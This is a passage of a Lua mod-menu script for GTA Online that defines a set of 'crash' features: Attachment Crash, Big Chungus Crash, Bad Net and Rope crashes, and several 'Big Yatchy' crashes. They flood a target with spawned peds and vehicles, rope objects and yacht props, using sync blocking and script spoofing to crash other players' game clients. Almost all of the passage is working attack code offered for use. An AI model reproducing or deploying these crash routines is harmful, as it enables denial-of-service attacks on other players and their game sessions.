menu.toggle(attachcrash, "Attachment Crash", {"toggleattach"}, "It will turn on anticam for you, Warning! This is OP...", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("anticrashcamera")
        util.yield(200)
        local player_ped = PLAYER.PLAYER_PED_ID()    
        local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
        local pld = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(pld)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -1210.615, 3850.737, 490.0916)
        util.yield(200)
        menu.trigger_commands("attachallnearby" .. players.get_name(pid))
        util.yield(200)
        menu.trigger_commands("tpallentitiesloop" .. players.get_name(pid))
        util.yield(200)
        menu.trigger_commands("craftloop1" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("craftloop2" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("craftloop3" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("craftloop4" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("craftloop5" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("badnet" .. players.get_name(pid))
        util.yield(200)
        menu.trigger_commands("togglefragv3" .. players.get_name(pid))
        util.yield(200)
        menu.trigger_commands("toggleweedcrash" .. players.get_name(pid))
        util.yield(200)
        menu.trigger_commands("vehcrash" .. players.get_name(pid))
        util.yield(200)
    else
        util.toast("Wait For TP Loop to finish or restart the script...")
        menu.trigger_commands("anticrashcamera")
        util.yield(200)
        menu.trigger_commands("attachallnearby" .. players.get_name(pid))
        util.yield(200)
        menu.trigger_commands("tpallentitiesloop" .. players.get_name(pid))
        util.yield(200)
        menu.trigger_commands("craftloop1" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("craftloop2" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("craftloop3" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("craftloop4" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("craftloop5" .. players.get_name(pid))
        util.yield(100)
        menu.trigger_commands("badnet" .. players.get_name(pid))
        util.yield(200)
        menu.trigger_commands("togglefragv3" .. players.get_name(pid))
        util.yield(200)
        menu.trigger_commands("toggleweedcrash" .. players.get_name(pid))
        util.yield(200)
        local player_ped = PLAYER.PLAYER_PED_ID()    
        local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
        local pld = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(pld)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -74.96841, -817.8495, 326.17517)
        util.yield(200)
        end
    end)

local chunguscrashes = menu.list(lobbycrash, "Big Chungus Crashes", {}, "")

menu.action(chunguscrashes, "Big Chungus Crash", {"bigchungus"}, "Skid from x-force Big CHUNGUS Crash. Coded by Picoles(RyzeScript)", function(on_toggle)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local mdl3 = util.joaat("A_F_M_ProlHost_01")
        local mdl4 = util.joaat("A_M_M_SouCent_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        util.request_model(mdl3)
        util.request_model(mdl4)
        for i = 1, 250 do
            local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
            local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
            local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
    
            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
    
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
    
            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
    
            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)
    
            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)
    
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
    
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
    
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)
    
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            util.yield(100)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
    
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
    
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
            
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)
    
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)
    
            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)
    
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
            ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
        entities.delete_by_handle(mdl)
        entities.delete_by_handle(mdl2)
        entities.delete_by_handle(mdl3)
        entities.delete_by_handle(mdl4)
        entities.delete_by_handle(veh_mdl)
        entities.delete_by_handle(veh_mdl2)
        util.yield(1000)
    end)

menu.toggle(chunguscrashes, "Big Chungus Crash", {"bigchungus"}, "Skid from x-force Big CHUNGUS Crash. Coded by Picoles(RyzeScript)", function(on_toggle)
if on_toggle then
    menu.trigger_commands("tploopon" .. players.get_name(pid))
    menu.trigger_commands("anticrashcamera On")
    menu.trigger_commands("invisibility On")
    menu.trigger_commands("levitate On")
    menu.trigger_commands("potatomode On")
    menu.trigger_commands("nosky On")
    menu.trigger_commands("reducedcollision On")
    menu.trigger_commands("nocollision On")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
    local mdl = util.joaat("A_C_Cat_01")
    local mdl2 = util.joaat("U_M_Y_Zombie_01")
    local mdl3 = util.joaat("A_F_M_ProlHost_01")
    local mdl4 = util.joaat("A_M_M_SouCent_01")
    local veh_mdl = util.joaat("insurgent2")
    local veh_mdl2 = util.joaat("brawler")
    util.request_model(veh_mdl)
    util.request_model(veh_mdl2)
    util.request_model(mdl)
    util.request_model(mdl2)
    util.request_model(mdl3)
    util.request_model(mdl4)
    for i = 1, 250 do
        local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
        local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
        local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
        local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
        local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
        local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
        PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

        PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

        PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

        PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
        PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

        PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

        PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

        TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)

        TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
        TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
        util.yield(100)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)

        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
        
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)

        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)

        ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
        ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)

        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
        PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
        PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
        PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
        ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
        ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
        TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
    entities.delete_by_handle(mdl)
    entities.delete_by_handle(mdl2)
    entities.delete_by_handle(mdl3)
    entities.delete_by_handle(mdl4)
    entities.delete_by_handle(veh_mdl)
    entities.delete_by_handle(veh_mdl2)
    util.yield(1000)
else
    menu.trigger_commands("tploopon" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("anticrashcamera Off")
    menu.trigger_commands("tpmazehelipad")
    menu.trigger_commands("invisibility Off")
    menu.trigger_commands("levitate Off")
    menu.trigger_commands("potatomode Off")
    menu.trigger_commands("nosky Off")
    menu.trigger_commands("reducedcollision Off")
    menu.trigger_commands("nocollision Off")
    end
end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


local keramicrash = menu.list(lobbycrash, "Kerami Crashes", {}, "")

menu.toggle_loop(keramicrash, "Bad Net Crash", {"badnet"}, "Skidded from kerami script.", function(on_toggle)
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            request_model(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1 
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    menu.trigger_commands("tpallentitiesloop" .. players.get_name(pid))
    util.yield(100)
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
		end
	end)

    menu.toggle_loop(keramicrash, "Bad Net Crash V2", {"badnetv2"}, "", function(on_toggle)
        local hashes = {970385471, 2336777441, 184361638, 1030400667, 920453016, 240201337, 642617954, 586013744, 868868440, 1550581940, 3334677549, 3186376089}
        local vehicles = {}
        for i = 1, 4 do
            util.create_thread(function()
                request_model(hashes[i])
                local pcoords = getEntityCoords(getPlayerPed(pid))
                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(hashes[i], veh, pcoords, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                for j = 0, 49 do
                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1 
                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
                end
                for j = 0, 20 do
                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
                end
                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
                for ai = 1, 50 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    pcoords = getEntityCoords(getPlayerPed(pid))
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
    
                    util.yield()
                end
                vehicles[#vehicles+1] = veh
            end)
        end
        util.yield(100)
        for _, v in pairs(vehicles) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
            entities.delete_by_handle(v)
            end
        end)

menu.toggle_loop(keramicrash, "Rope Crash Lobby", {"ropecrash"}, "", function(on_loop)
    --notification("Rope Crash Lobby sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    PHYSICS.ROPE_LOAD_TEXTURES()
    local hashes = {2132890591, 2727244247}
    local pc = getEntityCoords(getPlayerPed(pid))
    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
    local vehc = getEntityCoords(veh); local pedc = getEntityCoords(ped)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
    util.yield(1000)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    entities.delete_by_handle(veh); entities.delete_by_handle(ped)
    PHYSICS.DELETE_CHILD_ROPE(rope)
    PHYSICS.ROPE_UNLOAD_TEXTURES()
    end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local bigyachtycrash = menu.list(crash, "Big Yatchy Crashes", {}, "")

menu.action(bigyachtycrash, "Big Yatchy V1", {"bigyachtyv1"}, "Causes Crash Event (A1:EA0FF6AD) by sending a prop yacht.", function()
    local user = PLAYER.GET_PLAYER_PED(players.user())
    local model = util.joaat("h4_yacht_refproxy")
    local pos = players.get_position(pid)
    local oldPos = players.get_position(players.user())
    BlockSyncs(pid, function()
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
        PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
        util.yield(500)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
        util.yield(2500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user, true)
    end)
end)

menu.action(bigyachtycrash, "Big Yatchy V2", {"bigyachtyv2"}, "Causes Crash Event (A1:E8958704) by sending a prop yacht001.", function()
    local user = PLAYER.GET_PLAYER_PED(players.user())
    local model = util.joaat("h4_yacht_refproxy001")
    local pos = players.get_position(pid)
    local oldPos = players.get_position(players.user())
    BlockSyncs(pid, function()
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
        PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
        util.yield(500)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
        util.yield(2500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user, true)
    end)
end)

menu.action(bigyachtycrash, "Big Yatchy V3", {"bigyachtyv3"}, "Causes Crash Event (A1:1A7AEACE) by sending a prop yacht002.", function()
    local user = PLAYER.GET_PLAYER_PED(players.user())
    local model = util.joaat("h4_yacht_refproxy002")
    local pos = players.get_position(pid)
    local oldPos = players.get_position(players.user())
    BlockSyncs(pid, function()
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
        PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
        util.yield(500)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
        util.yield(2500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user, true)
    end)
end)

menu.action(bigyachtycrash, "Big Yatchy V4", {"bigyachtyv4"}, "Causes Crash Event (A1:408D3AA0) by sending a prop apayacht.", function()
    local user = PLAYER.GET_PLAYER_PED(players.user())
    local model = util.joaat("h4_mp_apa_yacht")
    local pos = players.get_position(pid)
    local oldPos = players.get_position(players.user())
    BlockSyncs(pid, function()
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
        PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
        util.yield(500)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
        util.yield(2500)
